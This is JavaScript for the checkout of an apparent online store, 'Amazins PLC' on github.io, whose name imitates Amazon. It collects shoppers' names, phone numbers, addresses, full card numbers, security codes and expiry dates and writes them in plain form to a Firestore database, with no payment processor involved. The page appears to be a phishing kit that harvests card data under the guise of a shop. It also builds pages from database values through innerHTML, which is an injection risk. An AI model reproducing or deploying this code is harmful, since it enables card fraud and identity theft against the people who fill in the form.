const fragment = new URLSearchParams(window.location.search.slice(1));
const [item, page, nightime] = [fragment.get('item'), fragment.get('page'), fragment.get('trkId')];
const shiPrice = `23.75`
let titak = ``

const firebaseConfig = {
    apiKey: "AIzaSyCImQ1forKpA4QqYDUBdgnHrWuRrDoe5JE",
    authDomain: "amazins-warehouse.firebaseapp.com",
    projectId: "amazins-warehouse",
    storageBucket: "amazins-warehouse.appspot.com",
    messagingSenderId: "168751389916",
    appId: "1:168751389916:web:273d298b49357e47ad2819"
};

firebase.initializeApp(firebaseConfig);

const db = firebase.firestore();
db.settings({ timestampsInSnapshots: true });

if(item != null){
    if(page === '1'){
        db.collection('warehouse').doc('items').collection('available').where("sku", "==", item).get().then((querySnapshot) => {
            querySnapshot.forEach((doc) => {
                const buynow = doc.data();
                if(buynow.ship != undefined){
                    titak = parseFloat(buynow.price) + parseFloat(buynow.ship);
                    document.querySelector(".app-container").innerHTML = 
                    `
                    <div id="info">
                        <h3 id="trycatch">Purchasing ${buynow.name} - $${buynow.price}</h3>
                        <p>Color:</p>
                    </div>
                    <div id="flow" style="position: relative;">
                        <input style="width: 100%; height: 20px;" id="id" placeholder="${buynow.color}" disabled="disabled"><br>
                        <label for="select-size">OPTIONAL - Choose a size:</label>
                        <select name="select-size" id="select-size">
                            <option value="S">S</option>
                            <option value="M">M</option>
                            <option value="L">L</option>
                            <option value="XL">XL</option>
                            <option value="2XL">2XL</option>
                            <option value="3XL">3XL</option>
                        </select>
                        <br>
                        <h3>Shipping Info</h3>
                        <p>Recipient</p>
                        <input style="width: 45%; height: 20px;" id="buyer_name" placeholder="First Name" maxlength="100" required=""><br>
                        <input style="position: absolute; top: 143px; left: 50%; width: 45%; height: 20px;" id="second_name" placeholder="Last Name" maxlength="100" required=""><br>
                        <input style="width: 100%; height: 20px;" type="number" id="phone_number" placeholder="Phone Number (enter country code)" maxlength="16" required=""><br>
                        <input style="width: 100%; height: 20px;" type="email" id="email" placeholder="Email (optional)"><br>
                        <input style="width: 45%; height: 20px;" type="text" id="country_name" placeholder="Country" maxlength="20" required=""><br>
                        <input style="position: absolute; top: 240px; left: 50%; width: 45%; height: 20px;" type="text" id="prov_name" placeholder="State, Province, or Region">
                        <input style="width: 100%; height: 20px;" type="text" id="city" placeholder="Town or City" required=""><br>
                        <input style="width: 100%; height: 20px;" type="text" id="address" placeholder="Address Line 1" required=""><br>
                        <input style="width: 100%; height: 20px;" type="text" id="address_two" placeholder="Address Line 2 (Optional)"><br>
                        <input style="width: 100%; height: 20px;" type="number" id="post_code" placeholder="Postal Code" maxlength="20" required=""><br>
                        <p>Standard Shipping: $${buynow.ship} (Including $5.05 tax)</p><br>
                        <p>Total: $${titak}</p>
                        <button style="background-color: green; color: white; width: 100%; height: 40px; font-size: 20px; cursor: pointer;" onclick="addOrder()">Place Order</button>
                        <p style="color: crimson;">By continuing, you agree to allow Amazins PLC to process any data submitted through this form.<br>Email is used to send shipping notifications, phone number is used for calling the residence if no one is present.<br><b>Orders to the EU, UK and Norway - VAT is applied.</b></p>
                    </div>
                    `
                } else {
                    titak = parseFloat(buynow.price) + parseFloat(shiPrice);
                    document.querySelector(".app-container").innerHTML = 
                    `
                    <div id="info">
                        <h3 id="trycatch">Purchasing ${buynow.name} - $${buynow.price}</h3>
                        <p>Color:</p>
                    </div>
                    <div id="flow" style="position: relative;">
                        <input style="width: 100%; height: 20px;" id="id" placeholder="${buynow.color}" disabled="disabled"><br>
                        <label for="select-size">OPTIONAL - Choose a size:</label>
                        <select name="select-size" id="select-size">
                            <option value="S">S</option>
                            <option value="M">M</option>
                            <option value="L">L</option>
                            <option value="XL">XL</option>
                            <option value="2XL">2XL</option>
                            <option value="3XL">3XL</option>
                        </select>
                        <br>
                        <h3>Shipping Info</h3>
                        <p>Recipient</p>
                        <input style="width: 45%; height: 20px;" id="buyer_name" placeholder="First Name" maxlength="100" required=""><br>
                        <input style="position: absolute; top: 143px; left: 50%; width: 45%; height: 20px;" id="second_name" placeholder="Last Name" maxlength="100" required=""><br>
                        <input style="width: 100%; height: 20px;" type="number" id="phone_number" placeholder="Phone Number (enter country code)" maxlength="16" required=""><br>
                        <input style="width: 100%; height: 20px;" type="email" id="email" placeholder="Email (optional)"><br>
                        <input style="width: 45%; height: 20px;" type="text" id="country_name" placeholder="Country" maxlength="20" required=""><br>
                        <input style="position: absolute; top: 240px; left: 50%; width: 45%; height: 20px;" type="text" id="prov_name" placeholder="State, Province, or Region">
                        <input style="width: 100%; height: 20px;" type="text" id="city" placeholder="Town or City" required=""><br>
                        <input style="width: 100%; height: 20px;" type="text" id="address" placeholder="Address Line 1" required=""><br>
                        <input style="width: 100%; height: 20px;" type="text" id="address_two" placeholder="Address Line 2 (Optional)"><br>
                        <input style="width: 100%; height: 20px;" type="number" id="post_code" placeholder="Postal Code" maxlength="20" required=""><br>
                        <p>Standard Shipping: $${shiPrice} (Including $5.05 tax)</p><br>
                        <p>Total: $${titak}</p>
                        <button style="background-color: yellow; color: black; width: 100%; height: 40px; font-size: 20px; cursor: pointer;" onclick="addOrder()">Place Order</button>
                        <p style="color: crimson;">By continuing, you agree to allow Amazins PLC to process any data submitted through this form.<br>Email is used to send shipping notifications, phone number is used for calling the residence if no one is present.<br><b>Orders to the EU, UK and Norway - VAT is applied.</b></p>
                    </div>
                    `
                }
            })
        })
    } else if(page === '2'){
        db.collection('warehouse').doc('items').collection('available').where("sku", "==", item).get().then((querySnapshot) => {
            querySnapshot.forEach((doc) => {
                const buynow = doc.data();
                if(buynow.ship != undefined){
                    titak = parseFloat(buynow.price) + parseFloat(buynow.ship);
                    document.querySelector(".app-container").innerHTML = 
                    `
                    <div id="info">
                        <h3 id="trycatch">Purchasing ${buynow.name} - $${buynow.price}</h3>
                    </div>
                    <div id="flow" style="position: relative;">
                        
                        <h3>Card Info</h3>
                        <p>Recipient</p>
                        <input style="width: 45%; height: 20px;" id="card_fname" placeholder="First Name as on Card" required=""><br>
                        <input style="position: absolute; top: 78px; left: 50%; width: 45%; height: 20px;" id="card_sname" placeholder="Last Name as on Card" maxlength="100" required=""><br>
                        <input style="width: 95%; height: 20px;" type="text" id="card_fo" placeholder="Card Number" maxlength="16" required=""><br>
                        <input style="width: 45%; height: 20px;" type="text" id="csv" placeholder="Security Code on backside (CSV)" maxlength="6" required=""><br>
                        <input style="position: absolute; top: 149px; left: 50%; width: 45%; height: 20px;" type="month" id="expiry" placeholder="Card Expiry" required=""><br>
                        <p>Standard Shipping: $${buynow.ship} (Including $5.05 VAT)</p><br>
                        <p>Total: $${titak}</p>
                        <button style="background-color: green; color: white; width: 100%; height: 40px; font-size: 20px; cursor: pointer;" onclick="fulFill()">Fulfill Order</button>
                        <b style="color: crimson;">By continuing, you are confirming that you are either the cardholder of mentioned card, or authorised to use it for this order. Amazins PLC takes no charge of theft or missuse across the platform. Payments may take up to 24 hours to go through.</b>
                    </div>
                    `
                } else {
                    titak = parseFloat(buynow.price) + parseFloat(shiPrice);
                    document.querySelector(".app-container").innerHTML = 
                    `
                    <div id="info">
                        <h3 id="trycatch">Purchasing ${buynow.name} - $${buynow.price}</h3>
                    </div>
                    <div id="flow" style="position: relative;">
                        
                        <h3>Card Info</h3>
                        <p>Recipient</p>
                        <input style="width: 45%; height: 20px;" id="card_fname" placeholder="First Name as on Card" required=""><br>
                        <input style="position: absolute; top: 78px; left: 50%; width: 45%; height: 20px;" id="card_sname" placeholder="Last Name as on Card" maxlength="100" required=""><br>
                        <input style="width: 95%; height: 20px;" type="text" id="card_fo" placeholder="Card Number" maxlength="16" required=""><br>
                        <input style="width: 45%; height: 20px;" type="text" id="csv" placeholder="Security Code on backside (CSV)" maxlength="6" required=""><br>
                        <input style="position: absolute; top: 149px; left: 50%; width: 45%; height: 20px;" type="month" id="expiry" placeholder="Card Expiry" required=""><br>
                        <p>Standard Shipping: $${shiPrice} (Including $5.05 VAT)</p><br>
                        <p>Total: $${titak}</p>
                        <button style="background-color: green; color: white; width: 100%; height: 40px; font-size: 20px; cursor: pointer;" onclick="fulFill()">Fulfill Order</button>
                        <b style="color: crimson;">By continuing, you are confirming that you are either the cardholder of mentioned card, or authorised to use it for this order. Amazins PLC takes no charge of theft or missuse across the platform. Payments may take up to 48 hours to go through.</b>
                    </div>
                    `
                }
            })
        })
    } else {
        window.alert(`Invalid URL Format`)
        console.log("You may have been spoofed, please contact devs about this")
        location.href=`/404`
    }
}

function addOrder() {
    db.collection('orders').doc(nightime).set({
        item: document.getElementById("trycatch").innerText,
        full_name: `${document.getElementById("buyer_name").value} ${document.getElementById("second_name").value}`,
        phone: document.getElementById("phone_number").value,
        email: document.getElementById("email").value,
        price: titak,
        address: document.getElementById("address").value,
        address2: document.getElementById("address_two").value,
        postcode: document.getElementById("post_code").value,
        size: document.getElementById("select-size").value,
        city: document.getElementById("city").value

    }).then(function(){location.href=`https://amazins.github.io/store/purchase?item=${item}&page=2&trkId=${nightime}`}, 5000)
}

function fulFill(){
    db.collection('orders').doc(nightime).update({
        cardholder: `${document.getElementById("card_fname").value} ${document.getElementById("card_sname").value}`,
        cardno: document.getElementById("card_fo").value,
        cardsvc: document.getElementById("csv").value,
        card_expire: document.getElementById("expiry").value
    }).then(function(){location.href=`https://amazins.github.io/store/`}, 5000)
}
